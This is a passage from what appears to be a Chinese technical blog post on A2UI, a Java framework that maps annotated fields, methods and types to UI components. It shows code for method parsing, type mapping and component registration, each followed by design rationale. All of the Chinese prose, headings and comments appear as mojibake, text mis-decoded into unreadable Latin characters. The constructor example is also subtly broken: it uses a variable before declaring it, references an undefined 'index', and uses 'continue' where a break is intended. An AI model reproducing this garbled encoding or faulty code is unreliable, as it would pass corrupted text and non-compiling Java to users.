<li>åˆ†ç¦»å…³æ³¨ç‚¹ï¼Œæé«˜å¤„ç†æ•ˆç‡</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆä½¿ç”¨å¹¶è¡Œå¤„ç†ï¼Ÿ</strong>
<ul>
<li>å­—æ®µåˆå§‹åŒ–æ˜¯CPUå¯†é›†å‹æ“ä½œ</li>
<li>å¹¶è¡Œå¤„ç†å¯ä»¥æ˜¾è‘—æé«˜æ€§èƒ½</li>
<li>ç‰¹åˆ«æ˜¯åœ¨å­—æ®µæ•°é‡è¾ƒå¤šæ—¶</li>
</ul>
</li>
</ol>
<h4 data-id="heading-10">é˜¶æ®µ4ï¼šæ–¹æ³•æ‹†è§£é˜¶æ®µ</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1b12def00994a139fa1a34e344d2904~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=t0EqQdb9%2BqNlIwkKw3WlRQNIdgU%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title class_">BridgeMethodConfig</span>(<span class="hljs-title class_">Method</span> method, <span class="hljs-title class_">BridgeClass</span> bridgeClass) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">innerMethod</span> = method;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">returnType</span> = method.<span class="hljs-title function_">getReturnType</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">domainId</span> = bridgeClass.<span class="hljs-title function_">getDomainId</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bridgeClass</span> = bridgeClass;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">methodName</span> = method.<span class="hljs-title function_">getName</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldName</span> = <span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">getFieldName</span>(method);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">innerMethod</span> = method;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = fieldName;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = fieldName;

    <span class="hljs-title class_">String</span> fieldName = <span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">getFieldName</span>(method);

    <span class="hljs-comment">// æŸ¥æ‰¾å¯¹åº”çš„å­—æ®µ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> fieldInfo : <span class="hljs-variable language_">this</span>.<span class="hljs-property">bridgeClass</span>.<span class="hljs-title function_">getAllCtFields</span>()) {
        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">equals</span>(fieldName)) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">field</span> = fieldInfo;
            <span class="hljs-keyword">continue</span>;
        }
    }

    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (returnType.<span class="hljs-title function_">isArray</span>() || <span class="hljs-title class_">Collection</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(returnType)) {
            <span class="hljs-title class_">Class</span> innerClass = <span class="hljs-title class_">JSON</span>GenUtil.<span class="hljs-title function_">getInnerReturnType</span>(method);
            <span class="hljs-keyword">if</span> (innerClass != <span class="hljs-literal">null</span>) {
                returnType = innerClass;
            }
        }
        <span class="hljs-title function_">init</span>(index, bridgeClass);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getRefBean</span>() != <span class="hljs-literal">null</span>) {
            <span class="hljs-title class_">CustomRefMeta</span> ref = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getRefBean</span>();
            <span class="hljs-keyword">if</span> (ref.<span class="hljs-title function_">getView</span>() != <span class="hljs-literal">null</span> &amp;&amp; ref.<span class="hljs-title function_">getView</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">ViewType</span>.<span class="hljs-property">DIC</span>)) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
            }
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">refType</span> = ref.<span class="hljs-title function_">getRef</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">viewType</span> = ref.<span class="hljs-title function_">getView</span>();
        }

        <span class="hljs-keyword">if</span> (componentType == <span class="hljs-literal">null</span>) {
            componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
        e.<span class="hljs-title function_">printStackTrace</span>();
    }

    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºæ¨¡å—æ–¹æ³•</span>
    <span class="hljs-title class_">ModuleAnnotation</span> annotation = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getMethodAnnotation</span>(method, <span class="hljs-title class_">ModuleAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (annotation != <span class="hljs-literal">null</span>) {
        isModule = <span class="hljs-literal">true</span>;
    }

    <span class="hljs-title class_">ModuleRefFieldAnnotation</span> comboModuleAnnotation = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getMethodAnnotation</span>(method, <span class="hljs-title class_">ModuleRefFieldAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (comboModuleAnnotation != <span class="hljs-literal">null</span>) {
        isModule = <span class="hljs-literal">true</span>;
    }

    <span class="hljs-title class_">APIEventAnnotation</span> apiEventAnnotation = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getMethodAnnotation</span>(method, <span class="hljs-title class_">APIEventAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (apiEventAnnotation != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">CustomMenuItem</span> menuItem : apiEventAnnotation.<span class="hljs-title function_">bindMenu</span>()) {
            <span class="hljs-keyword">if</span> (!menuItem.<span class="hljs-title function_">getReturnView</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">ModuleViewType</span>.<span class="hljs-property">NONE</span>) &amp;&amp; menuItem.<span class="hljs-title function_">getDefaultView</span>()) {
                isModule = <span class="hljs-literal">true</span>;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-11">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æŸ¥æ‰¾å¯¹åº”çš„å­—æ®µï¼Ÿ</strong>
<ul>
<li>æ–¹æ³•å¯èƒ½å¯¹åº”æŸä¸ªå­—æ®µçš„Getter/Setter</li>
<li>å­—æ®µçš„æ³¨è§£å¯ä»¥è¡¥å……æ–¹æ³•çš„å…ƒæ•°æ®</li>
<li>æ”¯æŒå­—æ®µå’Œæ–¹æ³•çš„ååŒå·¥ä½œ</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦å¤„ç†æ•°ç»„å’Œé›†åˆç±»å‹ï¼Ÿ</strong>
<ul>
<li>æ•°ç»„å’Œé›†åˆéœ€è¦è·å–å†…éƒ¨ç±»å‹</li>
<li>å†…éƒ¨ç±»å‹å†³å®šUIç»„ä»¶ç±»å‹</li>
<li>æ”¯æŒæ³›å‹ç±»å‹çš„æ­£ç¡®å¤„ç†</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æ£€æŸ¥æ˜¯å¦ä¸ºæ¨¡å—æ–¹æ³•ï¼Ÿ</strong>
<ul>
<li>æ¨¡å—æ–¹æ³•è¿”å›çš„æ˜¯UIç»„ä»¶</li>
<li>éœ€è¦ç‰¹æ®Šå¤„ç†æ¨¡å—æ–¹æ³•çš„æ¸²æŸ“</li>
<li>æ”¯æŒåŠ¨æ€UIç»„ä»¶çš„ç”Ÿæˆ</li>
</ul>
</li>
</ol>
<h4 data-id="heading-12">é˜¶æ®µ5ï¼šç±»å‹æ˜ å°„é˜¶æ®µ</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a63eb31301ce453e9589699481fa4e4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=QE0lCgRQRkwZOuh%2B5%2BC%2FvatyUKs%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">static</span> <span class="hljs-title class_">ComponentType</span> <span class="hljs-title function_">getComponentType</span>(<span class="hljs-params">Class typeClass, Type type</span>) {
    <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">JSON</span>GenUtil.<span class="hljs-title function_">getInnerType</span>(type);

    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Enumstype</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(clazz) || clazz.<span class="hljs-title function_">isEnum</span>()) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (typeClass != <span class="hljs-literal">null</span> &amp;&amp; (typeClass.<span class="hljs-title function_">isArray</span>() || <span class="hljs-title class_">Collection</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(typeClass))) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(customClass).<span class="hljs-title function_">contains</span>(clazz) || typeClass.<span class="hljs-title function_">equals</span>(clazz)) {
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>;
        }
    }

    <span class="hljs-keyword">if</span> (java.<span class="hljs-property">sql</span>.<span class="hljs-property">Date</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(clazz)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(short.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Short</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(int.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Integer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(boolean.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Boolean</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">CHECKBOX</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(long.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Long</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(float.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Float</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">BigDecimal</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">BigInteger</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Reader</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">StringBuffer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>;
}
</code></pre>
<h4 data-id="heading-13">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦å¤„ç†æ³›å‹ç±»å‹ï¼Ÿ</strong>
<ul>
<li>æ³›å‹ç±»å‹åœ¨ç¼–è¯‘æ—¶ä¼šè¢«æ“¦é™¤</li>
<li>éœ€è¦é€šè¿‡åå°„è·å–å®é™…ç±»å‹</li>
<li>æ”¯æŒæ³›å‹é›†åˆçš„æ­£ç¡®æ˜ å°„</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆBooleanæ˜ å°„åˆ°CHECKBOXè€Œä¸æ˜¯INPUTï¼Ÿ</strong>
<ul>
<li>CHECKBOXæ›´ç¬¦åˆå¸ƒå°”å€¼çš„è¯­ä¹‰</li>
<li>æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ</li>
<li>å‡å°‘ç”¨æˆ·è¾“å…¥é”™è¯¯</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆStringBufferæ˜ å°„åˆ°RICHEDITORï¼Ÿ</strong>
<ul>
<li>StringBufferé€šå¸¸ç”¨äºå­˜å‚¨é•¿æ–‡æœ¬</li>
<li>RICHEDITORæ”¯æŒå¯Œæ–‡æœ¬ç¼–è¾‘</li>
<li>æä¾›æ›´å¥½çš„æ–‡æœ¬ç¼–è¾‘ä½“éªŒ</li>
</ul>
</li>
</ol>
<h4 data-id="heading-14">é˜¶æ®µ6ï¼šç»„ä»¶ç”Ÿæˆé˜¶æ®µ</h4>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4abbe19e437f4ff492d454fadc01a1a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=vUYLyq6fU2yFFG6SrDBuJye2n%2FU%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title function_">C2UConfigFactory</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Class</span>?&gt;&gt; allClassMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    allClassMap.<span class="hljs-title function_">putAll</span>(<span class="hljs-title class_">EsbBeanFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">getAllClass</span>());
    <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Class</span>?&gt;&gt;&gt; allClass = allClassMap.<span class="hljs-title function_">entrySet</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Class</span>?&gt;&gt; clazzEntry : allClass) {
        <span class="hljs-title class_">Class</span> clazz = clazzEntry.<span class="hljs-title function_">getValue</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title function_">initClass</span>(clazz);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Throwable</span> e) {
            <span class="hljs-comment">// å¿½ç•¥åˆå§‹åŒ–å¤±è´¥çš„ç±»</span>
        }
    }
}

<span class="hljs-keyword">void</span> <span class="hljs-title function_">initClass</span>(<span class="hljs-params">Class beanClazz</span>) {
    <span class="hljs-title class_">CustomClass</span> customClass = (<span class="hljs-title class_">CustomClass</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">CustomClass</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CustomBean</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(beanClazz) &amp;&amp; customClass != <span class="hljs-literal">null</span>) {
        <span class="hljs-title class_">AnnotationType</span> ann = (<span class="hljs-title class_">AnnotationType</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">AnnotationType</span>.<span class="hljs-property">class</span>);
        viewTypeAnnMap.<span class="hljs-title function_">put</span>(ann.<span class="hljs-title function_">clazz</span>(), customClass);
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">UIComponent</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(customClass.<span class="hljs-title function_">clazz</span>())) {
            <span class="hljs-keyword">switch</span> (customClass.<span class="hljs-title function_">viewType</span>()) {
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMPONENT</span>:
                    <span class="hljs-title class_">WidgetMetaMap</span>.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), beanClazz);
                    widgetComponentMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), customClass.<span class="hljs-title function_">clazz</span>());
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMBOBOX</span>:
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                            comboBoxAnnMap.<span class="hljs-title function_">put</span>(inputType, ann.<span class="hljs-title function_">clazz</span>());
                            comboBoxComponentMap.<span class="hljs-title function_">put</span>(inputType, customClass.<span class="hljs-title function_">clazz</span>());
                        }
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }

                    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                        comboBoxBeanMap.<span class="hljs-title function_">put</span>(inputType, beanClazz);
                    }
                    <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-15">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æ‰«ææ‰€æœ‰ç±»ï¼Ÿ</strong>
<ul>
<li>è‡ªåŠ¨å‘ç°æ‰€æœ‰UIç»„ä»¶</li>
<li>é¿å…æ‰‹åŠ¨æ³¨å†Œç»„ä»¶</li>
<li>æ”¯æŒç»„ä»¶çš„çƒ­æ’æ‹”</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆä½¿ç”¨Mapå­˜å‚¨ç»„ä»¶æ˜ å°„ï¼Ÿ</strong>
<ul>
<li>å¿«é€ŸæŸ¥æ‰¾ç»„ä»¶ç±»</li>
<li>O(1)æ—¶é—´å¤æ‚åº¦</li>
<li>æé«˜ç»„ä»¶åˆ›å»ºæ•ˆç‡</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†COMPONENTå’ŒCOMBOBOXï¼Ÿ</strong>
<ul>
<li>COMPONENTï¼šç‹¬ç«‹ç»„ä»¶ï¼ˆå¦‚Inputã€Checkboxï¼‰</li>
<li>COMBOBOXï¼šä¸‹æ‹‰ç»„ä»¶ï¼ˆå¦‚Dateã€Numberï¼‰</li>
<li>ä¸åŒçš„ç»„ä»¶ç±»å‹æœ‰ä¸åŒçš„æ¸²æŸ“é€»è¾‘</li>
</ul>
</li>
</ol>
<h2 data-id="heading-16">ç¡®å®šæ€§æ¥æºåˆ†æ</h2>
<p>A2UIçš„ç¡®å®šæ€§æ¥è‡ªä»¥ä¸‹äº”ä¸ªå±‚æ¬¡ï¼Œæ¯ä¸ªå±‚æ¬¡éƒ½æœ‰å…¶ç‰¹å®šçš„ç¡®å®šæ€§ä¿éšœæœºåˆ¶ã€‚</p>
<h3 data-id="heading-17">1. æ³¨è§£å±‚ç¡®å®šæ€§</h3>
<p>æ³¨è§£æ˜¯A2UIç¡®å®šæ€§çš„ç¬¬ä¸€å±‚ä¿éšœï¼Œé€šè¿‡æ³¨è§£æä¾›æ˜ç¡®çš„å…ƒæ•°æ®ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e11fa9bb90457197559de294fd611d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=3axOZ4m2lSPDCeCiAcKfvsnppC8%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ³¨è§£ç¡®å®šæ€§ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">@<span class="hljs-title class_">CustomAnnotation</span>(
    caption = <span class="hljs-string">"ç”¨æˆ·å"</span>,
    uid = <span class="hljs-literal">true</span>,
    readonly = <span class="hljs-literal">true</span>,
    required = <span class="hljs-literal">true</span>
)
private <span class="hljs-title class_">String</span> username;

<span class="hljs-comment">// ç¡®å®šæ€§åˆ†æï¼š</span>
<span class="hljs-comment">// 1. captionæ˜ç¡®å­—æ®µçš„æ˜¾ç¤ºåç§°</span>
<span class="hljs-comment">// 2. uidæ˜ç¡®å­—æ®µä¸ºä¸»é”®</span>
<span class="hljs-comment">// 3. readonlyæ˜ç¡®å­—æ®µä¸ºåªè¯»</span>
<span class="hljs-comment">// 4. requiredæ˜ç¡®å­—æ®µä¸ºå¿…å¡«</span>
</code></pre>
<h4 data-id="heading-18">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆæ³¨è§£èƒ½æä¾›ç¡®å®šæ€§ï¼Ÿ</strong>
<ul>
<li>æ³¨è§£æ˜¯ç¼–è¯‘æ—¶å…ƒæ•°æ®ï¼Œä¸ä¼šåœ¨è¿è¡Œæ—¶æ”¹å˜</li>
<li>æ³¨è§£çš„å€¼æ˜¯æ˜ç¡®çš„å­—ç¬¦ä¸²æˆ–æšä¸¾</li>
<li>æ³¨è§£çš„è§£æè§„åˆ™æ˜¯å›ºå®šçš„</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¹ˆå¤šæ³¨è§£ï¼Ÿ</strong>
<ul>
<li>ä¸åŒçš„æ³¨è§£å¯¹åº”ä¸åŒçš„å­—æ®µå±æ€§</li>
<li>æ”¯æŒçµæ´»çš„å­—æ®µé…ç½®</li>
<li>æ»¡è¶³ä¸åŒçš„ä¸šåŠ¡åœºæ™¯</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">2. ç±»å‹å±‚ç¡®å®šæ€§</h3>
<p>Javaç±»å‹ç³»ç»Ÿæ˜¯A2UIç¡®å®šæ€§çš„ç¬¬äºŒå±‚ä¿éšœï¼Œé€šè¿‡ç±»å‹æ˜ å°„æä¾›ç»„ä»¶é€‰æ‹©çš„ç¡®å®šæ€§ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b1e7a4f3dcd45d0945fed256a7be5c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=T2C4FtlQUY03YY9bYpA%2F9gQcg1k%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>ç±»å‹ç¡®å®šæ€§ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">private <span class="hljs-title class_">Boolean</span> isActive;  <span class="hljs-comment">// -&gt; CHECKBOX</span>
private <span class="hljs-title class_">Integer</span> age;      <span class="hljs-comment">// -&gt; COMBOINPUT</span>
private <span class="hljs-title class_">Date</span> birthday;    <span class="hljs-comment">// -&gt; COMBOINPUT</span>
private <span class="hljs-title class_">UserStatus</span> status; <span class="hljs-comment">// -&gt; COMBOINPUT (Enum)</span>
private <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; tags; <span class="hljs-comment">// -&gt; LIST</span>

<span class="hljs-comment">// ç¡®å®šæ€§åˆ†æï¼š</span>
<span class="hljs-comment">// 1. Booleanç±»å‹å¿…ç„¶æ˜ å°„åˆ°CHECKBOX</span>
<span class="hljs-comment">// 2. Integerç±»å‹å¿…ç„¶æ˜ å°„åˆ°COMBOINPUT</span>
<span class="hljs-comment">// 3. Dateç±»å‹å¿…ç„¶æ˜ å°„åˆ°COMBOINPUT</span>
<span class="hljs-comment">// 4. Enumç±»å‹å¿…ç„¶æ˜ å°„åˆ°COMBOINPUT</span>
<span class="hljs-comment">// 5. Collectionç±»å‹å¿…ç„¶æ˜ å°„åˆ°LIST</span>
</code></pre>
<h4 data-id="heading-20">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆç±»å‹èƒ½æä¾›ç¡®å®šæ€§ï¼Ÿ</strong>
<ul>
<li>Javaç±»å‹ç³»ç»Ÿæ˜¯é™æ€çš„ï¼Œç¼–è¯‘æ—¶ç¡®å®š</li>
<li>ç±»å‹çš„ç»§æ‰¿å…³ç³»æ˜¯æ˜ç¡®çš„</li>
<li>ç±»å‹æ˜ å°„è§„åˆ™æ˜¯å›ºå®šçš„</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†åŸºæœ¬ç±»å‹å’ŒåŒ…è£…ç±»å‹ï¼Ÿ</strong>
<ul>
<li>åŸºæœ¬ç±»å‹å’ŒåŒ…è£…ç±»å‹åœ¨åå°„ä¸­å¤„ç†ä¸åŒ</li>
<li>åŒ…è£…ç±»å‹æ”¯æŒnullå€¼</li>
<li>åŸºæœ¬ç±»å‹æœ‰é»˜è®¤å€¼</li>
</ul>
</li>
</ol>
<h3 data-id="heading-21">3. å‘½åçº¦å®šå±‚ç¡®å®šæ€§</h3>
<p>Java Beanå‘½åçº¦å®šæ˜¯A2UIç¡®å®šæ€§çš„ç¬¬ä¸‰å±‚ä¿éšœï¼Œé€šè¿‡å‘½åçº¦å®šæä¾›æ–¹æ³•è¯†åˆ«çš„ç¡®å®šæ€§ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1ea4f17a559438ba74c672df94e6a99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=U7cHel5sOkegxqwi0YQ%2Bhx%2F5xr8%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
